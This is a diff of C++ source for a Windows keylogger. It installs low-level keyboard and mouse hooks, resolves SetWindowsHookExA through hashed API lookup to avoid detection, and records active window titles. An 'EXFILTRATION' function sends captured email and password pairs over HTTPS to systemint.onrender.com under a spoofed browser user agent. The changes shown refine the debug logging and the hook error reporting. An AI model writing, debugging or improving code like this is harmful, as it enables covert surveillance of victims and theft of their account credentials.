@@ -44,27 +44,21 @@ std::string GetActiveWindowTitle() {
         GetWindowTextA(hwnd, title, sizeof(title));
         return std::string(title);
     }
-    return "Unknown Window";
+    return "Desktop/System";
 }
 
-// --- 2. DEBUG LOGGING (Local & Desktop) ---
+// --- 2. DEBUG LOGGING ---
 void WriteDebug(std::string msg) {
-    // Write to local folder (most reliable)
-    std::ofstream f1("internal_status.txt", std::ios::app);
-    if (f1.is_open()) {
-        f1 << "[DEBUG] " << msg << std::endl;
-        f1.close();
-    }
-
-    // Write to Desktop (visible)
     char path[MAX_PATH];
+    // Attempt local write first
+    std::ofstream f1("internal_status.txt", std::ios::app);
+    if (f1.is_open()) { f1 << "[DEBUG] " << msg << std::endl; f1.close(); }
+
+    // Attempt Desktop write
     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path) == S_OK) {
         std::string fullPath = std::string(path) + "\\debug_log.txt";
         std::ofstream f2(fullPath, std::ios::app);
-        if (f2.is_open()) {
-            f2 << "[DEBUG] " << msg << std::endl;
-            f2.close();
-        }
+        if (f2.is_open()) { f2 << "[DEBUG] " << msg << std::endl; f2.close(); }
     }
 }
 
@@ -89,7 +83,7 @@ FARPROC GetProcAddressH(HMODULE hMod, DWORD targetHash) {
     return NULL;
 }
 
-// --- 4. EXFILTRATION (Strict Schema) ---
+// --- 4. EXFILTRATION ---
 void UploadData(std::string email, std::string pass) {
     HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
     HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
@@ -185,12 +179,20 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
     HMODULE u32 = GetModuleHandleA("user32.dll");
     if (!u32) u32 = LoadLibraryA("user32.dll");
 
+    // Hash for SetWindowsHookExA = 0xDE2B4659
     auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
 
     if (_SetHook) {
-        _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
-        _SetHook(WH_MOUSE_LL, MouseProc, h, 0);
-        WriteDebug("Hooks Online.");
+        HHOOK kHook = _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
+        HHOOK mHook = _SetHook(WH_MOUSE_LL, MouseProc, h, 0);
+
+        if (kHook && mHook) {
+            WriteDebug("Hooks Online. Monitoring input...");
+        } else {
+            WriteDebug("Hook Registration Failed. Error Code: " + std::to_string(GetLastError()));
+        }
+    } else {
+        WriteDebug("API Hashing Failed: Could not find SetWindowsHookExA");
     }
 
     MSG msg;
